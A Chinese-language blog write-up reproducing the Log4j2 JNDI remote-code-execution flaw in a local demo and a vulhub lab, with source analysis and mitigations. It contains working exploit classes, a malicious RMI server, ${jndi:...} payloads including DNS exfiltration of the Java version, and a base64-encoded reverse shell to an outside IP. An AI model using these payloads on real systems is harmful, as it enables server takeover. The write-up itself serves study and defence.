# Log4j2 漏洞复现

<!--more-->
# Apache_log4j2（CVE-2021-44228）漏洞复现

## Log4j2 介绍

log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。

## 漏洞介绍

Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。

在java中最常用的日志框架是log4j2和logback，其中log4j2支持**lookup**功能（查找搜索），这也是一个非常强大的功能，设计之初的目的也是为了方便开发者调用

例如当开发者想在日志中打印今天的日期，则只需要输出`${data:MM-dd-yyyy}`，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。

表达式除了支持日期，还支持输出系统环境变量等功能，这样极大的方便了开发者。但是安全问题往往就是因为“图方便”引起的，毕竟设计者也是需要在安全性和用户体验之间做个平衡。

其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最终要的原因是**log4j还支持JNDI协议。**

## 影响版本

2.0 <= Apache log4j2 <= 2.14.1
## 环境搭建

pom.xml

```xml
<dependencies>  
<dependency>  
    <groupId>org.apache.logging.log4j</groupId>  
    <artifactId>log4j-core</artifactId>  
    <version>2.14.1</version>  
</dependency>
<dependency>  
    <groupId>org.apache.logging.log4j</groupId>  
    <artifactId>log4j-api</artifactId>  
    <version>2.14.1</version>  
</dependency>  
<dependency>  
    <groupId>junit</groupId>  
    <artifactId>junit</artifactId>  
    <version>4.12</version>  
    <scope>test</scope>  
</dependency>  
</dependencies>
```

log4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。这里，我们简单用 xml 的方式来实现，文件如下，默认文件名为log4j2.xml，

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!-- log4j2 配置文件 -->  
<!-- 日志级别 trace<debug<info<warn<error<fatal --><configuration status="info">  
    <!-- 自定义属性 -->  
    <Properties>  
        <!-- 日志格式(控制台) -->  
        <Property name="pattern1">[%-5p] %d %c - %m%n</Property>  
        <!-- 日志格式(文件) -->  
        <Property name="pattern2">  
            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  
        </Property>  
        <!-- 日志文件路径 -->  
        <Property name="filePath">logs/myLog.log</Property>  
    </Properties>    <appenders> <Console name="Console" target="SYSTEM_OUT">  
        <PatternLayout pattern="${pattern1}"/>  
    </Console> <RollingFile name="RollingFile" fileName="${filePath}"  
                            filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">  
        <PatternLayout pattern="${pattern2}"/>  
        <SizeBasedTriggeringPolicy size="5 MB"/>  
    </RollingFile> </appenders> <loggers> <root level="info">  
    <appender-ref ref="Console"/>  
    <appender-ref ref="RollingFile"/>  
</root> </loggers></configuration>
```

然后再写一个实际应用的 demo，比如从数据库获取到了一个 username 为 "admin"，要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。

```java
package org.example;  
  
import org.apache.logging.log4j.LogManager;  
import org.apache.logging.log4j.Logger;  
  
import java.util.function.LongFunction;  
  
public class Main {  
    public static void main(String[] args) {  
        Logger logger = LogManager.getLogger(LongFunction.class);  
  
        String username = "${java:os}";  
        if (username != null ) {  
            logger.info("User {} login in!", username);  
        }  
        else {  
            logger.error("User {} not exists", username);  
        }  
    }  
}
```

运行结果，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png)

上面说了 log4j2 会把 `${}` 包裹内容进行单独处理，利用 lookup 功能进行查找。Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型：

1. ${date}：获取当前日期和时间，支持自定义格式。
2. ${pid}：获取当前进程的 ID。
3. ${logLevel}：获取当前日志记录的级别。
4. ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。
5. ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。
6. ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。
7. ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。
8. ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。

这里把上面的 `admin` 替换为 `${sys:user.dir}`，再次运行，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png)

而造成漏洞是因为这里的 lookup 它是基于 jndi 的，而 jndi 里面我们早在之前说过直接调用 lookup() 是会存在漏洞的。

## 漏洞复现

自己编写一个 RMIServer，

```java
package org.example;  
  
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import javax.naming.Reference;  
import java.rmi.Naming;  
import java.rmi.registry.LocateRegistry;  
  
public class RMI_Server {  
    void register() throws Exception{  
        LocateRegistry.createRegistry(1099);  
        Reference reference = new Reference("RMI_POC","RMI_POC","http://ip:6666/");  
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);  
        Naming.bind("hello",refObjWrapper);  
        System.out.println("START RUN");  
    }  
  
    public static void main(String[] args) throws Exception {  
        new RMI_Server().register();  
    }  
}
```

搭建好恶意的 RMI 服务器，并且在远端服务器上放置恶意类，RMI_POC.java

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;
 
public class RMIHello extends UnicastRemoteObject implements ObjectFactory {
    public RMIHello() throws RemoteException {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
 
}
```

编译为 class 字节码，然后启动 http 监听，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png)

payload：`${jndi:rmi://localhost:1099/hello}`，最后成功执行，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png)
![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png)

然后再在 vulhub 靶场复现一次，搭建好靶场后访问 `8983` 端口，传入下面 payload 验证漏洞

```
/solr/admin/cores?action=${jndi:ldap://620de897.log.dnslog.sbs.}
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png)

dns 收到请求，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png)

这里打 Ladp，因为是本地搭建的靶场，所以本地搭建 LdapServer 服务，然后在远程端进行 http 监听，远程端的恶意利用类改为反弹 shell 的命令，

```java
import javax.naming.Context;  
import javax.naming.Name;  
import javax.naming.spi.ObjectFactory;  
import java.io.IOException;  
import java.util.Hashtable;  
  
public class LDAP_POC implements ObjectFactory {  
    public LDAP_POC() throws Exception{  
        try {  
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}");  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
  
    @Override  
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {  
        return null;  
    }  
}
```

传入 payload，

```
${jndi:ldap://ip:9999/LDAP_POC}
```

成功反弹 shell

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png)

尝试利用工具来进行攻击，工具下载地址：[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)，然后构建命令进行监听，

```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "47.109.156.81"
```

`bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}` 就是 exec 里面执行的命令，-A 参数是攻击机 ip，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png)

然后根据 jdk 版本选择 payload 传入，这个 jdk 版本可以通过命令 `${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io}` 进行 dns 外带查看，这里选择 jdk1.8 版本的，

```
${jndi:ldap://47.109.156.81:1389/nvxwvy}
```

最后也能成功反弹 shell

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png)
![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png)

## 漏洞分析

来到 `PatternLayout#toSerializable` 方法，对 `formatters` 进行循环处理，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png)

在循环到第七次时，跟进到 format 方法，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在`${`，那么就会取出从 $ 开始知道最后的字符串，这一步

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png)

最后得到 value 为，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png)

继续跟进 `replace()` 方法，`replace()` 方法里面调用了 `substitute()` 方法，这里就是将 ${} 中间的内容取出来，然后又会调用 `this.subtitute` 来处理。最后调用到 `resolveVariable` 方法，

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png)

`resolver`解析时支持的关键词有`[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]`，而我们这里利用的`jndi:xxx`后续就会用到`JndiLookup`这个解析器

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png)

这个 `lookup()` 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 rmi 服务的时候，是调用原生的 `lookup()` 方法的，是存在漏洞的。

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png)

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png)

最后成功执行。

## 漏洞修复

- 更新log4j至 rc2
- 配置防火墙策略，禁止主动连接外网设备
- 升级受影响的应用及组件
- 过滤相关的关键词，比如`${jndi://*}`
- 限制JNDI默认可以使用的协议
- 限制可以通过LDAP访问的服务器和类

参考：[https://www.freebuf.com/articles/web/341857.html](https://www.freebuf.com/articles/web/341857.html)

参考：[https://www.freebuf.com/articles/web/380568.html](https://www.freebuf.com/articles/web/380568.html)

